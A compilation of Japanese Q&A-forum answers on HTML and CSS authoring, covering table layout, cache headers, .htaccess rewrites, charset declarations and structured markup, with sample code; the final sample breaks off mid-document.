>単なるコーディングの間違いで表示できないのか、 >それとも未だにFirefoxではtableの中でrelativeが >うまく働かないのかを知りたいのです。 ご自分で答えがでているのでは？ 単なるコーディングの間違いでしょう。 現に、アップされたソースではtableの中のrelativeが働いているのですから、原因は違うところにあることは、明白。組み合わせで出現するバグもありますが、それには困っている現状が確認できる最小限のソースがないと、アドバイスはでません。そして、困っていることが出現するか否かの差異を自分で探るうちに、自己解決できることも多いです。 >少々複雑なtableでレイアウトしてて、そのセルの >一角に背景（またはイメージ）を埋め込み、その上 >に色々な別の画像を配置し、表示しようとしている >わけです。 じゃあ、素直に、そのセルの背景として、背景を表示し、コンテンツとして、上のイメージを表示させれば、何の問題もないのでは？ <table border="1"> <tr> <td style="background:url(画像１)"> <img src="画像２"> </td> </tr> </table> >スキルが未熟なせいでどこがいけないのか見当がつきません。かといって全ソースを掲載するわけにもいきません。また、cell-padding,cell-specingやcssでの同様な機能をすべて無効にしてもうまく表示できないのでお手上げ状態です。 cssのｃを配慮していますか？その表へのcssの問題の箇所以外をすべて削って上手くいかないのなら、継承などの問題があるかもしれませんね。ソースがないとどうしようもないです。 >かと言って掲載したソースの簡単な表のなかではう >まく表示できるのに... だから、着目点と違う場所が間違っているのでは？ >それとできれば「この時はこうすればいいよ」みた >いなスキルがあれば助言をお願いしたいと思います。 検索するとうまく解決できた方もおられる様だったのですが、ヒントだけで私の頭では解決できませんでした。になるだけではないでしょうか。 ソースを出せばいいのでは？無理なら、近くにいる詳しい人に聞く。いなければ、プロに頼む。教室に行く。 技術的Q&Aサイトでは、的を射た質問には、的を射た答えが、わからないことがわからない質問には、無視されるか、質問がわかりませんという答えにしかなりません。意地悪をしているわけではないので、ご理解ください。＃2さんの質問には答えておられないし、ソースも出さないとなれば、Q&Aでの問題解決は困難といわざるをえないです。難しいスキルではないのですが、素直さは必要ですね。
音が出るのは嫌われるサイトの作り方の一つですし、相応の理由がない限りおすすめしません。 <script> var audio=new Audio(); audio.src='click.mp3'; </script> <a onclick="audio.play();">クリック</a> HTML5（のAudio）対応ブラウザで、mp3に対応したブラウザで動作します。 Safariのどのバージョンから対応してるのかは不明（面倒なので調べてません）です。 音声ファイルの読み込みが遅いと、クリックしても再生できないことがあります。 スクリプトで音声ファイルを読み込む代わりに <audio src="click.mp3" id="audio"></audio> <a onclick="audio.play();"> などの書き方もできますが、 （文法上です。この方法は試していません。 <audio>のsrc属性ではなく<source>にしなければいけないかもしれません。 document.all.audio.play()でないと再生できないかもしれません。） JavaScript停止ブラウザでも読み込みが発生しますので、スクリプトで処理する物はスクリプトだけで完結させる方が良いと思います。
階層というとディレクトリ(フォルダ)をイメージしてしまうので、厳密に言えば、index.htmlとlink01.htmlのファイルが同ディレクトリに置かれているのであれば1階層になりますね。ただ、この場合の階層って、トップページから何回クリックしたらたどり着くかってことではないですかね。 ところで、水を指すようですが、SEO目的で相互リンクを利用しようとされているのでしたら、もういちど相互リンクについて調べたほうがいいと思いますよ。ここでは持論と取ってもらって構いませんが、効果がないばかりか、検索エンジンからペナルティを受ける確率を上げるだけだと思いますよ。
俺はWindows Live SkyDriveを使っていて60.2MBのファイルでも出来る。 ただし… *この前から何か「サードパーティクッキー」を有効にしないとダウンロードできなくなった。 *「サードパーティクッキー」とは何か自分で勉強してエンドユーザーに説明し、エンドユーザーが自分の判断でデメリットを許容できるようなら有効にするように勧めること。 **最近問題になったね。説明が不十分なプリインストールソフト。「無料」とか何とかより「何なのか」の説明を。 http://www.tomds.com/e/123/ **あとはこの辺。 http://www.yoshibaworks.com/ayacy/inasoft/talk/h … **有効にしてダウンロードし、エンドユーザーに「無効」戻すよう、指示すること。
http://www.microsoft.com/download/en/details.asp … ----引用はじめ---- In order to help web designers and web developers test their websites in older versions of Internet Explorer, we've provided the following VHD with Windows set up with the specified version of Internet Explorer. ----引用終わり---- いま確認したら Windows 7 の Internet Explorer 9 の VirtualPC 用の VHD もあったから確認できるかも。
https://www.google.com/search?q=meta+name+robots
最優先の選択肢(全ての文書の共通手段)。 HTTP ヘッダを触れるなら、 http://www.studyinghttp.net/caching#Expiration_M … 例えば、全くキャッシュさせないなら、 | Cache-Control:no-cache | Pragma: no-cache 2番目の選択肢(text/html の場合) HTTP ヘッダの代わりに meta タグでキャッシュコントロールする。 3番目の選択肢(text/css, image/png など text/html 以外の場合) HTTP ヘッダを触れない場合の代替手段としてクエリーをつけて別の文書として認識させる。 ちなみに、このページの → http://oshiete.goo.ne.jp/qa/7174389.html CSS の一つ、 → http://gazo.okwave.jp/okwave/css/base.css は、Tue, 06 Dec 2011 06:52:07 GMT の時点で、 キャッシュに関係する HTTP ヘッダが、 | Date:Tue, 06 Dec 2011 06:52:07 GMT | Cache-Control:max-age=300 | Etag:"1047-4a734bce36600" | Expires:Tue, 06 Dec 2011 06:57:07 GMT | Last-Modified:Mon, 04 Jul 2011 02:00:56 GMT だったから、5分後には、キャッシュが無効になるようにしているみたい。
とんでもない誤解をされています。 本来、それがどのようなデータであれ、サーバーからファイルを提供するときにファイルの実体より前に、改行を二個はさんで、HTTP応答ヘッダが送られてきます。 　firefoxにLive HTTP Headerというアドオンがありますが、それを使うとブラウザとサーバー間でどのようなやり取りをしているかわかります。 　その応答ヘッダで、 content-type:application/octet-stream 　が指定されていると、ファイルの種類に関わらず、ダウンロードするべきです。 　あなたのウェブサイトに「download」というフォルダーを作成し、そこに AddType application/octet-stream * と記述した .htaccess というファイルを置いておけば、そのファイルがabc.htmlだろうと、abc.hogeだろうと、すべてダウンロードされるべきです。 　メモ帳で作成するときは名前をつけて保存で".htaccess"と""で括らないと、ファイル名のないファイルは保存できません。 　では、なぜ、exeや、zip がダウンロードされるかと言うと、サーバーの設定で、これらの拡張子を持つファイルは、application/octet-streamと指定されているからに過ぎません。ここを間違えないように・・ 　ただ、Windowsは、他のOS--UNIX,Linux,Macなどと異なり、ファイルの拡張子で動作を決める--ルール違反の仕様なので、たとえサーバーからそのような応答ヘッダが付けられていても、htmlなら、ブラウザで起動しようとするバグがありました。(現在走りません) 　.zipがダウンロードされるのは偶然でもなんでもなくて、サーバーとあなたのブラウザの設定がそのように指定されているからで、すべての人に有効なわけではありません。Windows(とIE)だけが、特殊なので、たまたまそのように動作するだけです。
されようとしていることがわかりません。 form全体を教えてください。
　複数のブロックを「段組もどき」で配置することと、記事を段組することの違いはきちんと区別してください。本来の段組は、長い記事を一行８０文字とかで表示すると目で追うのが大変なので、４０文字の二段に段組して、二つの段にテキストを流し込むことを言います。そとと3では、それが用意されます。 CSS Multi-column Layout Module ( http://www.w3.org/TR/2011/CR-css3-multicol-20110 … ) 　これは、文書構造上、記事自体は連続しているものをプレゼンテーションで二段に分けるという問題なので、HTMLではなくCSSで指定すべきですから、HTML5だろうとHTML6だろうとHTMLには用意されないでしょう。 　さて、本題のブロックを並べる方法ですが、HTML5で <body> 　<header> 　</header> 　<section> 　　<h2>記事見出し</h2> 　　<div id="tableContent"><!-- 目次 --></div> 　　<section> 　　　<h3>章見出し</h3> 　　　・・記事・・ 　　</section> 　　<section> 　　　<h3>章見出し</h3> 　　　・・記事・・ 　　</section> 　　<section> 　　　<h3>章見出し</h3> 　　　・・記事・・ 　　</section> 　</section> 　<footer> 　　<nav id="sitmap"></div> 　</footer> </body> というHTMLがある場合、body>section内のdiv.tableContentは、body>sectionの左横に置き、footer navは、ページの右に置く。本文の章はウィンドウの巾によって一段から３段に段組して表示する・・・なんてことが、文書構造を変更せずに出来るようになるでしょう。 　
相対URL指定をしているのでは？<img src="a.jpg">とか？ num1/ と number.html?inp=1 とではディレクトリ階層が違いますよ。 上記imgタグなら、ブラウザは当然 num1/a.jpg を見に行きますが、そこに画像が無いのでは？ 相対パスを使うなら、例えば RewriteRule ^num([0-9]+)$ number.html?inp=$1 [L] のようにしないと。 あるいは、画像やcssのパスもリライトするか。number.htmlと同じ階層にあるとすると、 RewriteRule ^num([0-9]+)/$ number.html?inp=$1 [L] RewriteRule ^num[0-9]+/(.*\.(jpg|gif|png|css))$ $1 [L]
「ホームページに「最新ニュース」の欄を設置したいのですが、 以下のような要件の場合、どのような仕組みを使うのがよいのでしょうか？」 　cgiによる掲示板を設置して、そこにニュースを載せる。もしくは「PukiWiki」などで、自由に更新できる仕掛けにしておく。ただし、パスワードなどで、第３者による不正更新を防止する必要がありますが。
RewriteRule ^num([0-9]+)/$ number.html?inp=$1 [L] でしょう。
No.1です。 　訪問者が閲覧しているファイルのパスを意識していることは、まずありえません。 　たくさんのページで構成されているサイト(たとえば、まさしくこの掲示板)には、迷子にならないよう「カテゴリ [技術者向] コンピューター ＞ プログラミング ＞ HTML 」とかが記されています。これは『パンくずリスト（breadcrumb）』と呼ばれるものです。[詳しくは、Wikipedia ( http://ja.wikipedia.org/wiki/%E3%83%91%E3%83%B3% … )] 　以前回答したのですが、 ファイルの構築 - ホームページ作成ソフト - 教えて！goo ( http://oshiete.goo.ne.jp/qa/5730017.html#a2 )のように、ディレクトリを整理するほうが製作には楽です。 　しかし、各ページからの他のページへのリンクは、せいぜい数個、ないし10個程度に抑えるほうが使用するほうからは楽です。 index.html[トップページ/ホーム] 会社案内 　→業務内容 　→自社業務 　→品質方針 　→環境方針 　→お問合せ 　 業務内容のページ 　　→概要 　　→沿革 　　→アクセス 　　→トップページへ 　　製品・商品 　　→商品群A 　　→商品群B 　　→商品群C 　　　商品群A 　　　　→商品 　　　　→商品 　そして各ページに、パンくずリストと、トップページのメニュー(業務内容・自社業務・品質方針・環境方針・お問合せ)があればよいと思います。 　製作の立場と閲覧者の立場は異なりますが、大まかなところは同じ形でよいでしょう。
いわゆるfileプロトコルはセキュリティ上の問題も多いため ブラウザによって安定しません。 今日日できないものと考えた方がよいでしょう。 必要があるならネットワークドライブだったら、 ファイルサーバーにhttpサーバーを起動させ、httpプロトコルとして アクセスするのが賢明だと思います
そもそもフレームが推奨されていないので フレームをやめるしかないでしょうね
#5 です。 > METAタグの charsetが設定されているのにも関わらず、このような結果になるのは驚きです。 <meta> にはレスポンスヘッダの代替としての役割もあります。 Content-Type: text/html; charset=UTF-8 と <meta http-equiv="content-type" content="text/html; charset=UTF-8" /> は同じなのです。(よく読めばわかると思います) http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ただ、HTTPヘッダの代替としての役割を担った全ての <meta> でHTTPヘッダを優先するかはわからないので、とりあえず Content-Type においてはHTTPヘッダが優先されると覚えておいてください。 # 詳しくは知りませんが、キャッシュ制御あたりは実装依存の度合いが強いようです。 当然のことながら通常はHTTPヘッダと <meta> で異なる値と指定しません。 どちらか一方にだけ指定するか、同じ値を指定するように気をつければいいはずですが、 文字コードに関しては間違うと文字化けが発生する危険性があるため、HTML4 に限らず XML 1.0, CSS2 でも厳密に規定されています。
できそうなんだけど.... 参考URL：http://msugai.fc2web.com/web/CSS/selector.html
サイト内ファイル間での301リダイレクト　www無しも考慮 Redirect 301 /old/old.html ｈｔｔｐ://ｗｗｗ.sample.com/new/new.html 　　　　　　　　　　　　　　　　（全角 → 半角に）
＞リンクをhoverした場合に、下の階層がスクロールされるような表現をやりたいのです。 　まだ、よくわからないのですが、「スクロール」とは「画面での表示をずらしていくこと」でスクロール機能を持つユーザーエージェントに対してスライダーを表示することなのですが、その意味だとすると、あらかじめ枠が表示されているが、リンクにポインターを置いたときのみスライダーが現れると言う意味でしょうか？ 　そのHTMLをサンプルとして最後にあげておきます。 　 　それとは違うよく使う方法(プルダウンメニュー)のスタイルシートもあわせて書いておきます。31行目から37行目をコメントアウトして、３９行目と４０行のコメントアウトを外すとそちらになります。 ★ここは、HTMLの質問ページですから、スタイルシートについては説明しませんが、HTMLさえきちんと出来ていれば、スタイルシートでどのようにでもデザインできます。 「HTMLはサンプルのように、きちんと文書構造にしたがってマークアップしてください。」 が、回答と考えてください。 なお、 ★Another HTML-lint gateway( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★The W3C Markup Validation Service( http://validator.w3.org/#validate_by_input ) で検証済みです。 ★タブは＿に置換してありますから、元に戻してテストしてください。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.header{padding-bottom:2em;} div.nav ol,div.nav ol li{ ＿display:block;list-style:none; ＿margin:0;padding:0; ＿line-height:2em; ＿text-align:center; ＿background-color:white; } div.nav a{ ＿display:block; ＿width:100%;height:100%; ＿text-decoration:none; } div.nav ol li{ ＿width: 10em; ＿border:solid 1px gray; ＿position:relative; } /* 親リストを縦に並べて詳細は親リストに:hoverしたときのみスクロール */ div.nav ol li ol{ ＿height:6em;overflow:hidden; } div.nav ol li:hover ol{ ＿overflow:scroll; ＿width:12em; } /* 親リストを横に並べる */ /* div.nav ol li:hover ol{display:block;position:absolute;} div.nav ol li{float:left;} div.nav ol li ol{display:none;} div.nav ol li:hover ol{top:2em;left:0} div.section{clear:left;} div.nav{width:31em;margin:0 auto;} */ --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>サンプル</h1> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="./m1">menue1</a> ＿＿＿＿＿<ol> ＿＿＿＿＿＿<li><a href="./m1-1">menue1-1</a></li> ＿＿＿＿＿＿<li><a href="./m1-2">menue1-2</a></li> ＿＿＿＿＿＿<li><a href="./m1-3">menue1-3</a></li> ＿＿＿＿＿＿<li><a href="./m1-4">menue1-4</a></li> ＿＿＿＿＿</ol> ＿＿＿＿</li> ＿＿＿＿<li><a href="./m2">menue2</a> ＿＿＿＿＿<ol> ＿＿＿＿＿＿<li><a href="./m2-1">menue2-1</a></li> ＿＿＿＿＿＿<li><a href="./m2-2">menue2-2</a></li> ＿＿＿＿＿＿<li><a href="./m2-3">menue2-3</a></li> ＿＿＿＿＿＿<li><a href="./m2-4">menue2-4</a></li> ＿＿＿＿＿</ol> ＿＿＿＿</li> ＿＿＿＿<li><a href="./m3">menue3</a> ＿＿＿＿＿<ol> ＿＿＿＿＿＿<li><a href="./m3-1">menue3-1</a></li> ＿＿＿＿＿＿<li><a href="./m3-2">menue3-2</a></li> ＿＿＿＿＿＿<li><a href="./m3-3">menue3-3</a></li> ＿＿＿＿＿＿<li><a href="./m3-4">menue3-4</a></li> ＿＿＿＿＿</ol> ＿＿＿＿</li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>本文</h2> ＿</div> ＿<div class="footer"> ＿＿<h2>フッタ(文書情報)</h2> ＿</div> </body> </html>
＞いろいろあるとは思いますが作る側はだいぶ配慮が求められるようになりましたね。 ＞あきらめようと思います。 　そうではなくて、HTML4.01の時代から「HTMLからプレゼンテーションに関わるものは非推奨で、将来廃止される」となっていました。 　きちんと文書構造にしたがってマークアップされていれば、デザインはHTMLのプレゼンテーション機能の制約を越えて自由に設定できます。 「画像の右中央に文字を配置したい」のでしたら、それは、ある文章を背景画像の右中央に配置したい」と考えます。 <p id="message">ようこそ、我が家へ</p> でしたら、スタイルシートは #message{ width:200px;margin:0 auto; background:url(画像URL) no-repeat 50% 50% gray; height:150px; line-height:150px; text-align:right; } で良いはずです。
bordercolorlightとbordercolordark の意味が不明です。CSS2.1には、 border-color:light・・なんて値はありません。 light/darkと書かれていることから、明るい暗いだと思いますが・・・ ★4.3.6 Colors ( http://www.w3.org/TR/CSS2/syndata.html#color-units ) 　何をしたいかを明記してください。
＞<li>のリンクをクリックすると下の内容が変わるのはどういう仕組みなのでしょう 　ブラウザの表示メニューから「スタイルシートなし」を選択してみたら、極めてシンプルなHTMLだと言うことがわかると思います。 　単純にページ内アンカーに飛んでいるだけです。 　HTML5では、HTML4.01以上に、文書構造に従ったマークアップが求められています。実はHTML4.01もそうであったが、 「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　しかし、その部分はまったく守られていなかったために、HTML5では、文書構造を示すタグが追加されたにすぎません。！！！！ 　ソースを見られてもお分かりのように、スタイルシートを除けば、わかりやすいマークアップがされています。あなたにも検索エンジンにもわかる。 　デザイン、どのように見せるかと、文書構造は独立して考えるべきです。まず、デザインは後回しにして、HTMLの基本をしっかりと学んでください。HTML5はまだ勧告の段階ではありませんから、HTML4.01strictを身につけること。 ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　とか。・・・HTML4.01ですが、HTML5は、HTML4.01strictの改訂版です。transitinalなんて知らなくて良い。 　その後、スタイルシートを学んでください。
table関連のプロパティは、ブロックやインライン要素などの他のプロパティと違うので区別して覚えましょう。 　ここではスペースの関係でごく簡単にしか説明できません。 　詳しくは、 ★17. 表について ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) (注)CSS2.1であつても、table関連のプロパティは、すべてに対応しているブラウザは現時点でも皆無ですから注意すること。 下記はサンプルです。border-spacing:の値がひとつのときは上下左右、ふたつあるときは前の数字が左右、後ろの数字が上下になります。 　なお、タブは＿に置換してあります。 <table summary="縦の間隔"> ＿<tbody> ＿＿<tr> ＿＿＿<th abbr="あ">あ行</th><td>あ</td><td>い</td><td>う</td><td>え</td><td>お</td> ＿＿</tr> ＿＿<tr> ＿＿＿<th abbr="か">か行</th><td>か</td><td>き</td><td>く</td><td>け</td><td>こ</td> ＿＿</tr> ＿＿<tr> ＿＿＿<th abbr="さ">さ行</th><td>さ</td><td>し</td><td>す</td><td>せ</td><td>そ</td> ＿＿</tr> ＿</tbody> </table> <table summary="横の間隔"> ＿<tbody> ＿＿<tr> ＿＿＿<th abbr="あ">あ行</th><td>あ</td><td>い</td><td>う</td><td>え</td><td>お</td> ＿＿</tr> ＿＿<tr> ＿＿＿<th abbr="か">か行</th><td>か</td><td>き</td><td>く</td><td>け</td><td>こ</td> ＿＿</tr> ＿＿<tr> ＿＿＿<th abbr="さ">さ行</th><td>さ</td><td>し</td><td>す</td><td>せ</td><td>そ</td> ＿＿</tr> ＿</tbody> </table> において、 table{ ＿border-collapse:separate; ＿border:solid 2px black; ＿margin: 10px auto; } table[summary="縦の間隔"]{ ＿border-spacing:0 10px; } table[summary="横の間隔"]{ ＿border-spacing:10px 0; } table th,table td{ ＿border:solid 1px gray; ＿width: 6em; }
IEは、しばしばウェブ標準に反する挙動をするので誤解しますが、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ここで、ソース文書中で語間に空白類が複数連なっている場合、PRE要素を除いて、レンダリング結果の語間スペース調整は全く異なるものになるという点に注意されたい。 特にユーザエージェントは、語間スペースの出力処理に際しては、連続する空白類の入力があった場合は1つにまとめてしまう必要がある。 これは、lang属性やHTTP "Content-Language"ヘッダフィールド([RFC2616]の14.12参照)、ユーザの設定、等による言語情報が存在しない場合であっても、可能かつ必要な動作である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［9.1 空白類( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　ということで、これは正統な処理です。IEが間違っている。<img><object>も共にインライン要素ですから、そうでなければまずいです。これは、次のような例を考えるとわかるでしょう。 <p> 　my name is 　ORUKA1951. </p> 　というソースを表示したとき、my name isOROKA1951.じゃまずい!! 　基本的にひとつの段落ないしブロックに入るべきものですから <p> 　<img><img><img> </p> 　となるべきです。それでも消したい場合は <p> 　<img><!-- --><img><!-- --><img> <p> とか、 <p> 　<img 　><img 　><img> <p> とか・・ <p class="imageLine"> 　<img> 　<img> 　<img> <p> として p{clear:left;} p.imageLine img{ 　float:left; } あるいは、 p.imageLine { display:table-cell; *display:inline; /* IE */ *zoom:1;/* IE */ } いずれにしても、文法的には、<img><img>が正しいです。私はそもそもそのような画像の並べ方はしません。そうしなければならないと言うことは、必ず文法や文書構造上の問題があります。(画像を読み込まないユーザーエージェントで代替テキストを表示させて意味が通じますか?) 　実際には、あなたの<img><object>が文書構成上、どのようにマークアップすべきかがわかりませんので、具体的な対策は示せませんが、画像を敷き詰めるなら、スタイルシートでfloatを使うなり、display:block;にするなり・・もあるでしよう。
ああ、よく見たら、6と15がかぶってますね。 使用されているエンコードがUTF8なら15はいらないですね。 SHIFT-JISの場合は、1を修正して、6削除ですね。 あと、titleタグは、エンコードの指定より後に書いたほうがいいですよ。 7と13もかぶってますね。どちらかいらないです。 まあ、それ以外は好みです。 なくてもいいものもありますが、あっても特別に困ることはないと思います。
#5、#6です。（前回、間違って連投してしまいました。失礼。） ＞載せたい画像の大きさはそれぞれ違うので一括指定できません。 どこをいじられたのかわかりませんが、別に画像サイズを固定する必要はありません。 表示部分のサイズを固定してもよければ、画像の枠（にあたるli要素）のサイズを」固定しておけば、画像のサイズは自由に出来るのではないでしょうか。 表示部分のサイズも可変とかいろいろになると、スクリプトを使ってしまった方が簡単そう。 前回とほとんど同じですが、 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> <html lang="ja"> <head><title>sample</title> <meta http-equiv="Content-Style-Type" content="text/css"> <meta http-equiv="Content-Script-Type" content="text/javascript"> <meta http-equiv="Content-Type" content="text/html; charset=shift_jis"> <style type="text/css"> <!-- #navi, #images { float:left; } ul, li { list-style-type:none; padding:0; margin:0; } #navi { width:10em; } #navi img { width:4em; height:2em; border-width:0px; } #images { width:600px; height:300px; overflow:hidden; } #images li { width:600px; height:300px; text-align:center; overflow:auto; } //--> </style> </head> <body> <div> <ul id="navi"> <li><a href="#img1"><img src="img/photo01.jpg" alt="photo1">photo1</a></li> <li><a href="#img2"><img src="img/photo02.jpg" alt="photo2">photo2</a></li> <li><a href="#img3"><img src="img/photo03.jpg" alt="photo3">photo3</a></li> <li><a href="#img4"><img src="img/photo04.jpg" alt="photo4">photo4</a></li> <li><a href="#img5"><img src="img/photo05.jpg" alt="photo5">photo5</a></li> <li><a href="#img6"><img src="img/photo06.jpg" alt="photo6">photo6</a></li> </ul> <ul id="images"> <li><a name="img1"><img src="img/photo01.jpg" alt="photo1" style="width:400px; heigth:200px"></a></li> <li><a name="img2"><img src="img/photo02.jpg" alt="photo2" style="width:300px; height:100px;"></a></li> <li><a name="img3"><img src="img/photo03.jpg" alt="photo3" style="width:800px; height500px;"></a></li> <li><a name="img4"><img src="img/photo04.jpg" alt="photo4"></a></li> <li><a name="img5"><img src="img/photo05.jpg" alt="photo5"></a></li> <li><a name="img6"><img src="img/photo06.jpg" alt="photo6"></a></li> </ul> </div> *スクリプトを使ってもよいのであれば、たくさんのものがライブラリ化されているので、探せばいろいろ見つかると思います。 ＜以下一例＞ http://sandbox.scriptiny.com/javascript-slideshow/ http://www.fabulant.com/downloadcenter/imgfadezo … http://myisland.jp/template/gallery/gallery04.html
HTMLを書き直さないなら table+tabele tr td{padding-left:1em;} table+tabele tr td+td{padding-left:0;} table+tabele tr td+td+td+td+td{padding-right:1em;} 新しいブラウザのみなら table+table tr td:first-child{padding-left:1em;} table+table tr td:last-child{padding-right:1em;} ただ、全体的にあまりにも古い書き方です。 frame="hsides" rules="rows" bgcolorなどはスタイルシートで・・
データ量は関係ないと思います。 スタイルシートに日本語などは含まれていませんか? HTMLとCSSの文字コードは正しくて、かつきちんと宣言されてますか? XHTMLの場合、スタイルシートで大文字でタイプセレクタが指定してあるのに、HTMLは小文字になっているとかはないですか？ 　CSSが冗長ではありませんか？ Firefoxではいかがでしょう。firefoxのアドオンにfirebugがあります。それでそれぞれの要素にどのスタイルが継承されているかなども詳しくわかるのですが・・・
> http://www.sample.com/abc/などは、読み込んではいるものの、CSSや画像の読み込みが出来ていない状態です。文字だけの表示となってしまいます。 これは、.htaccessの問題ではなくて 404.html内から呼んでいるcssや画像が、相対リンクになっていて、 サブディレクトリからだと呼べないということではないでしょうか？ つまり、404.htmlを修正して、cssや画像を絶対パス呼び出しにすればよいのではないでしょうか？
何かちょっと誤解が激しいようなのだが。。 ■Google Maps APIは現在のver3から、キー不要に v2は来年早々にオワコンになるため、いまさらv2で開発はないと思いますが。。 ■ルータの中であろうが外であろうが、ネット接続できている環境なら、Google Maps APIは単なるJavsScriptコードなので、問題なく取得可能です。 （あくまでクライアントマシン環境が問題。サーバの場所は関係ない） ■１行書いたら確認できる、というのはよくわからないが、ローカルアクセス（C:\aaa\bbb\ccc.htmlなど）から外部インターネット接続するときに使うのは、Mark of the Webつうやつか <!-- saved from url=(0023)http://www.contoso.com/ --> とやると、ローカル再生のhtmlで、指定ドメインからの再生であるかのようにセキュリティ設定できる。IEのみ有効。 参考URL：http://msdn.microsoft.com/en-us/library/ms537628(v=vs.85).aspx
CGIが入っていないのであればそこらへんのPC向けレンタルサーバーやホームページスペースで十分です。 HTMLだけならそんなに容量もいりません。 ↓で紹介しているのは一例でプレビューが簡単だからです。 http://ascii.jp/elem/000/000/538/538092/ プレビューをアップロードせずにPC内で出来たら無料のサーバーでも問題ありません。 ただ、スマートフォンで見られることを意識してページを作らないといけません。 http://d.hatena.ne.jp/izit_kosuke/20110129/12963 … ↑こちらのブログを参考にされたほうがいいかもしれません
どう「崩れる」のか一切説明がないからわからないけど、時々CSSファイルの読み込みに失敗することはある。
javascriptで、スタイルを書き換える方法が良いでしょう。 javascript 一部 表示 非表示 - Google 検索 ( http://www.google.co.jp/#pq=javascript+%E8%A1%A8 … )
ホームページの1ページは基本的に、内容構造を示すHTMLと、レイアウトを示すCSSと、動的にHTML/CSSを変更するJavaScriptの、3種類のファイルによって構成されています。それぞれに文法があり、難易度としては、HTML→CSS→JavaScriptの順で難易度が高いと思います。 さて、本題の効果ですが、一般的にはJavaScriptを用いて例のような効果を実装します。 また、新しいブラウザだけを対象にするならCSSだけでも実装することができます。 いずれにしても初心者さんが1からつくるには難易度が高いものだと思います。 どうしても実装したいのであれば、「jquery ギャラリー　サンプル」などのキーワード検索で、はじめから完成しているプログラムをどこかで入手してそのまま使うのが現実的です。その場合は、デザインなどはご自身の都合に合わないものがほとんどだと思いますが、その辺りは諦めるしかありません。 ご自身で実装されるのであれば、「ホームページ作成ソフトの使い方」の領域はクリアして、HTML/CSS/JavaScriptについての基礎を学ばれることをおすすめします。
HTMLはタグですが、CSSはセレクタです。 もう、そろそろtransitinalは捨てましょう。 HTML4.01の仕様書(1999年)にも ＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿ HTML文書を作る場合には、この仕様における、他のDTDセットではなくstrict DTD に適合する文書を作るよう推奨る。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ HTML4.01仕様書(4 適合条件: 必須事項と推奨事項)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )より と明記してあります。 まず、HTMLは文書構造にしたがってマークアップしましょう。でないと提示されたようにDIVばっかりの--divスープが出来てしまいますし、後日見直したときに中に何が書かれているかわからなくなりますし、検索エンジンも理解できません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より なお、いくつかCSSの記法でも誤りがありますが、それは下記検証サイトで確認してください。 また、 ・同じプロパティを何度も書かないようセレクタホグループにする。 ・カスケーディング機能を活用するなどしてシンプルにわかりやすくしましょう。 　下記サンプルは、あなたのものと比較してシンプルでわかりやすい。それでいてスマホにも幅広ディスプレイにも対応します。 ・*{margin:0;padding:0;}は某オーサリングツール由来ですが、使うのは止めましょう。すべてのセレクタで改めて設定しなければならなくなります。 　そのうえで、HTMLとCSSのサンプルをあげておきます。 ★Another HTML-lint gateway( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★The W3C Markup Validation Service( http://validator.w3.org/#validate_by_input ) で検証済み。＿はタブに戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} p{text-indent:1em;line-height:160%;margin:0 1em;} div.header,div.section,div.footer{ ＿width:70%; ＿min-width:640px;max-width:760px;/* スマホ,幅広ディスプレイ対応 */ ＿position:relative;/* 子孫ボックスabsoluteの基準点 */ ＿border:solid 1px gray; } div.header{text-align:right;background-color:#ffd700;height:230px;} div.header h1,div.header p{margin-right:10px;} div.header ul,div.header ul li{ ＿display:block;list-style:none; ＿margin:0;padding:0; ＿text-align:center; ＿background-color:#0c907c; ＿line-height:30px; } div.header ul{ ＿position:absolute; ＿bottom:0; ＿width:100%; } div.header ul li{width:19%;float:left;} div.header ul li+li{border-left: solid 1px #FF3366;} div.header ul li a{display:block;width:100%;height:100%;text-decoration:none;} div.section{background-color:blue;color:white;min-height:300px;} div.section div.section{margin:0 21%;width:58%;min-width:0;} div.section div.tableContent, div.section div.aside{ ＿width:20%;height:100%; ＿position:absolute;top:0; } div.section div.tableContent{left:0;} div.section div.aside{right:0;} div.footer{background-color:#FF3366;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>サンプル</h1> 